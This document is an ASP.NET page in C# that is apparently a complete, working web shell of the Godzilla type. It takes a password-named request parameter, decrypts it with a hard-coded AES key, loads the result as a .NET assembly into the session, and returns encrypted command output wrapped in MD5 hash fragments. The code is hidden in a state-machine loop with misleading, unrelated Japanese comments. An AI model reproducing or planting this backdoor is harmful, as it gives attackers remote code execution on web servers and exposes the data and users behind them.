<%@ Page Language="C#"%><%
// 月が綺麗ですね
var z_state = 0;
var z_k = "3c6e0b8a9c15224a";
var z_p = "wolfshell";
object z_data = null;
object z_s_data = null;
object z_m_hash = null;
object z_out = null;

// 昨日の晩御飯はカレーでした
while(z_state < 10) {
    switch(z_state) {
        case 0:
            try {
                z_m_hash = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(z_p + z_k))).Replace(new string(new char[]{'-'}), "");
                z_state = 1;
            } catch { z_state = 100; }
            break;
        case 1:
            // このコードは一体何をしているんだ？
            z_data = System.Convert.FromBase64String(Context.Request[z_p]);
            z_state = 2;
            break;
        case 2:
            // 頑張ってください！
            var z_algo = new System.Security.Cryptography.RijndaelManaged();
            var z_k_b = System.Text.Encoding.Default.GetBytes(z_k);
            var z_dec = z_algo.CreateDecryptor(z_k_b, z_k_b);
            z_s_data = z_dec.TransformFinalBlock((byte[])z_data, 0, ((byte[])z_data).Length);
            z_state = 3;
            break;
        case 3:
            if (Context.Session["payload"] == null) {
                z_state = 4;
            } else {
                z_state = 5;
            }
            break;
        case 4:
            // 猫はかわいい
            var z_asm_type = System.Type.GetType("System.Reflection.Assembly");
            var z_load_m = z_asm_type.GetMethod("Load", new System.Type[] { typeof(byte[]) });
            Context.Session["payload"] = z_load_m.Invoke(null, new object[] { z_s_data });
            z_state = 100; // 終了
            break;
        case 5:
            // もう眠い
            z_out = new System.IO.MemoryStream();
            z_state = 6;
            break;
        case 6:
            // コーヒーを一杯ください
            var z_instance = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY");
            z_instance.Equals(Context);
            z_instance.Equals(z_out);
            z_instance.Equals(z_s_data);
            z_instance.ToString();
            z_state = 7;
            break;
        case 7:
            // ここにバグがあるかもしれません
            var z_final_algo = new System.Security.Cryptography.RijndaelManaged();
            var z_final_kb = System.Text.Encoding.Default.GetBytes(z_k);
            var z_enc = z_final_algo.CreateEncryptor(z_final_kb, z_final_kb);
            var z_res_bytes = ((System.IO.MemoryStream)z_out).ToArray();
            var z_enc_res = z_enc.TransformFinalBlock(z_res_bytes, 0, z_res_bytes.Length);
            z_out = System.Convert.ToBase64String(z_enc_res);
            z_state = 8;
            break;
        case 8:
            var z_hash_str = (string)z_m_hash;
            Context.Response.Write(z_hash_str.Substring(0, 16));
            Context.Response.Write((string)z_out);
            Context.Response.Write(z_hash_str.Substring(16));
            z_state = 100;
            break;
        default:
            // 決して到達しない
            z_state = 100;
            break;
    }
}
%>